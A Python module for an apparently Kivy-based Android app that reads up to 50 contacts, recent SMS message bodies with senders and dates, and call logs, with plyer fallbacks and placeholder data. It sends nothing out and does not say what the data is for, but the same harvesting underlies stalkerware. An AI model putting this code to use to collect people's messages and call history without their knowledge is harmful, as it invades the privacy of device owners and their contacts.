"""
Social utilities for collecting contacts, SMS, and call logs
"""
import logging

logger = logging.getLogger(__name__)

def get_contacts():
    """
    Get device contacts using plyer with Android-specific fallbacks
    Returns: list of dicts with contact info
    """
    try:
        from plyer import contact
        contacts_list = contact.get_contacts()

        contacts = []
        for contact_info in contacts_list[:50]:  # Limit to 50 contacts
            contacts.append({
                'nome': contact_info.get('name', 'Unknown'),
                'telefone': contact_info.get('phone', 'Unknown')
            })

        logger.info(f"Collected {len(contacts)} contacts via plyer")
        return contacts

    except ImportError:
        logger.warning("plyer not available for contacts, trying Android-specific")
        return get_contacts_android()
    except Exception as e:
        logger.error(f"Plyer contacts collection error: {e}")
        return get_contacts_android()

def get_contacts_android():
    """
    Get contacts using Android-specific APIs with improved error handling
    Returns: list of dicts with contact info
    """
    try:
        from jnius import autoclass
        from android.permissions import request_permissions, Permission

        # Request permissions first
        request_permissions([Permission.READ_CONTACTS])

        # Get ContentResolver
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        content_resolver = PythonActivity.mActivity.getContentResolver()

        # Query contacts with proper projection
        ContactsContract = autoclass('android.provider.ContactsContract')
        projection = [
            ContactsContract.Contacts._ID,
            ContactsContract.Contacts.DISPLAY_NAME,
            ContactsContract.Contacts.HAS_PHONE_NUMBER
        ]

        cursor = content_resolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            projection, None, None,
            ContactsContract.Contacts.DISPLAY_NAME + " ASC"
        )

        contacts = []
        if cursor and cursor.moveToFirst():
            id_index = cursor.getColumnIndex(ContactsContract.Contacts._ID)
            name_index = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
            has_phone_index = cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)

            count = 0
            while not cursor.isAfterLast() and count < 50:  # Limit to 50
                try:
                    contact_id = cursor.getString(id_index)
                    name = cursor.getString(name_index) if name_index >= 0 else "Unknown"
                    has_phone = cursor.getInt(has_phone_index) > 0

                    if has_phone:
                        # Get phone numbers for this contact
                        phone_cursor = content_resolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            [ContactsContract.CommonDataKinds.Phone.NUMBER],
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            [contact_id],
                            None
                        )

                        if phone_cursor and phone_cursor.moveToFirst():
                            phone_index = phone_cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                            if phone_index >= 0:
                                phone = phone_cursor.getString(phone_index)
                                if phone:
                                    contacts.append({
                                        'nome': str(name),
                                        'telefone': str(phone).replace(' ', '').replace('-', '')
                                    })
                                    count += 1

                        if phone_cursor:
                            phone_cursor.close()

                except Exception as e:
                    logger.warning(f"Error processing contact: {e}")

                cursor.moveToNext()

        if cursor:
            cursor.close()

        logger.info(f"Collected {len(contacts)} contacts via Android API")
        return contacts

    except ImportError:
        logger.warning("jnius not available for contacts, using plyer fallback")
        return get_contacts_plyer()
    except Exception as e:
        logger.error(f"Android contacts collection error: {e}")
        return get_contacts_placeholder()

def get_contacts_plyer():
    """
    Get contacts using plyer as fallback
    Returns: list of dicts with contact info
    """
    try:
        from plyer import contact
        contacts_list = contact.get_contacts()

        contacts = []
        for contact_info in contacts_list[:50]:  # Limit to 50 contacts
            contacts.append({
                'nome': contact_info.get('name', 'Unknown'),
                'telefone': contact_info.get('phone', 'Unknown')
            })

        logger.info(f"Collected {len(contacts)} contacts via plyer")
        return contacts

    except Exception as e:
        logger.error(f"Plyer contacts error: {e}")
        return get_contacts_placeholder()

def get_contacts_placeholder():
    """
    Return placeholder contacts data
    """
    contacts = [
        {'nome': 'Contato Exemplo', 'telefone': '+5511999999999'}
    ]
    return contacts

def get_sms():
    """
    Get SMS messages using Android APIs with plyer fallback
    Returns: list of dicts with SMS info
    """
    # Try Android-specific first
    android_sms = get_sms_android()
    if android_sms:
        return android_sms

    # Fallback to plyer
    try:
        from plyer import sms
        sms_list = sms.get_sms()

        sms_messages = []
        for sms_info in sms_list[:50]:  # Limit to 50 SMS
            sms_messages.append({
                'remetente': sms_info.get('sender', 'Unknown'),
                'destinatario': sms_info.get('recipient', 'device'),
                'mensagem': sms_info.get('body', ''),
                'data_envio': sms_info.get('timestamp', ''),
                'tipo': sms_info.get('type', 'recebido')
            })

        logger.info(f"Collected {len(sms_messages)} SMS messages via plyer")
        return sms_messages

    except ImportError:
        logger.warning("plyer not available for SMS, using placeholder")
        return get_sms_placeholder()
    except Exception as e:
        logger.error(f"SMS collection error: {e}")
        return get_sms_placeholder()

def get_sms_android():
    """
    Get SMS using Android Content Provider
    Returns: list of dicts with SMS info or None if failed
    """
    try:
        from jnius import autoclass
        from android.permissions import request_permissions, Permission

        # Request permissions
        request_permissions([Permission.READ_SMS])

        # Get ContentResolver
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        content_resolver = PythonActivity.mActivity.getContentResolver()

        # Query SMS inbox
        Telephony = autoclass('android.provider.Telephony')
        uri = Telephony.Sms.Inbox.CONTENT_URI

        projection = [
            Telephony.Sms.ADDRESS,
            Telephony.Sms.BODY,
            Telephony.Sms.DATE,
            Telephony.Sms.TYPE
        ]

        cursor = content_resolver.query(uri, projection, None, None, Telephony.Sms.DATE + " DESC")

        sms_messages = []
        if cursor and cursor.moveToFirst():
            address_index = cursor.getColumnIndex(Telephony.Sms.ADDRESS)
            body_index = cursor.getColumnIndex(Telephony.Sms.BODY)
            date_index = cursor.getColumnIndex(Telephony.Sms.DATE)
            type_index = cursor.getColumnIndex(Telephony.Sms.TYPE)

            count = 0
            while not cursor.isAfterLast() and count < 50:  # Limit to 50
                try:
                    address = cursor.getString(address_index) if address_index >= 0 else "Unknown"
                    body = cursor.getString(body_index) if body_index >= 0 else ""
                    date = cursor.getLong(date_index) if date_index >= 0 else 0
                    sms_type = cursor.getInt(type_index) if type_index >= 0 else 1

                    # Convert timestamp to ISO format
                    from datetime import datetime
                    date_str = datetime.fromtimestamp(date / 1000).isoformat() if date > 0 else ""

                    # Determine type
                    tipo = 'recebido' if sms_type == 1 else 'enviado'

                    sms_messages.append({
                        'remetente': address if tipo == 'recebido' else 'device',
                        'destinatario': 'device' if tipo == 'recebido' else address,
                        'mensagem': body,
                        'data_envio': date_str,
                        'tipo': tipo
                    })
                    count += 1

                except Exception as e:
                    logger.warning(f"Error processing SMS: {e}")

                cursor.moveToNext()

        if cursor:
            cursor.close()

        logger.info(f"Collected {len(sms_messages)} SMS messages via Android API")
        return sms_messages

    except Exception as e:
        logger.error(f"Android SMS collection error: {e}")
        return None

def get_sms_placeholder():
    """
    Return placeholder SMS data
    """
    return [
        {
            'remetente': '+5511999999999',
            'destinatario': 'device',
            'mensagem': 'Mensagem de exemplo',
            'data_envio': '2024-01-01T12:00:00Z',
            'tipo': 'recebido'
        }
    ]

def get_call_logs():
    """
    Get call logs using Android APIs with plyer fallback
    Returns: list of dicts with call info
    """
    # Try Android-specific first
    android_calls = get_call_logs_android()
    if android_calls:
        return android_calls

    # Fallback to plyer
    try:
        from plyer import call
        call_list = call.get_call_log()

        calls = []
        for call_info in call_list[:50]:  # Limit to 50 calls
            calls.append({
                'numero': call_info.get('number', 'Unknown'),
                'tipo': call_info.get('type', 'recebida'),
                'duracao': call_info.get('duration', 0),
                'data_chamada': call_info.get('timestamp', '')
            })

        logger.info(f"Collected {len(calls)} call logs via plyer")
        return calls

    except ImportError:
        logger.warning("plyer not available for call logs, using placeholder")
        return get_call_logs_placeholder()
    except Exception as e:
        logger.error(f"Call logs collection error: {e}")
        return get_call_logs_placeholder()

def get_call_logs_android():
    """
    Get call logs using Android CallLog provider
    Returns: list of dicts with call info or None if failed
    """
    try:
        from jnius import autoclass
        from android.permissions import request_permissions, Permission

        # Request permissions
        request_permissions([Permission.READ_CALL_LOG])

        # Get ContentResolver
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        content_resolver = PythonActivity.mActivity.getContentResolver()

        # Query call logs
        CallLog = autoclass('android.provider.CallLog')
        uri = CallLog.Calls.CONTENT_URI

        projection = [
            CallLog.Calls.NUMBER,
            CallLog.Calls.TYPE,
            CallLog.Calls.DURATION,
            CallLog.Calls.DATE
        ]

        cursor = content_resolver.query(uri, projection, None, None, CallLog.Calls.DATE + " DESC")

        calls = []
        if cursor and cursor.moveToFirst():
            number_index = cursor.getColumnIndex(CallLog.Calls.NUMBER)
            type_index = cursor.getColumnIndex(CallLog.Calls.TYPE)
            duration_index = cursor.getColumnIndex(CallLog.Calls.DURATION)
            date_index = cursor.getColumnIndex(CallLog.Calls.DATE)

            count = 0
            while not cursor.isAfterLast() and count < 50:  # Limit to 50
                try:
                    number = cursor.getString(number_index) if number_index >= 0 else "Unknown"
                    call_type = cursor.getInt(type_index) if type_index >= 0 else 1
                    duration = cursor.getLong(duration_index) if duration_index >= 0 else 0
                    date = cursor.getLong(date_index) if date_index >= 0 else 0

                    # Convert timestamp to ISO format
                    from datetime import datetime
                    date_str = datetime.fromtimestamp(date / 1000).isoformat() if date > 0 else ""

                    # Determine call type
                    if call_type == CallLog.Calls.INCOMING_TYPE:
                        tipo = 'recebida'
                    elif call_type == CallLog.Calls.OUTGOING_TYPE:
                        tipo = 'efetuada'
                    elif call_type == CallLog.Calls.MISSED_TYPE:
                        tipo = 'perdida'
                    else:
                        tipo = 'desconhecida'

                    calls.append({
                        'numero': number,
                        'tipo': tipo,
                        'duracao': int(duration),
                        'data_chamada': date_str
                    })
                    count += 1

                except Exception as e:
                    logger.warning(f"Error processing call log: {e}")

                cursor.moveToNext()

        if cursor:
            cursor.close()

        logger.info(f"Collected {len(calls)} call logs via Android API")
        return calls

    except Exception as e:
        logger.error(f"Android call logs collection error: {e}")
        return None

def get_call_logs_placeholder():
    """
    Return placeholder call logs data
    """
    return [
        {
            'numero': '+5511999999999',
            'tipo': 'recebida',
            'duracao': 120,
            'data_chamada': '2024-01-01T12:00:00Z'
        }
    ]
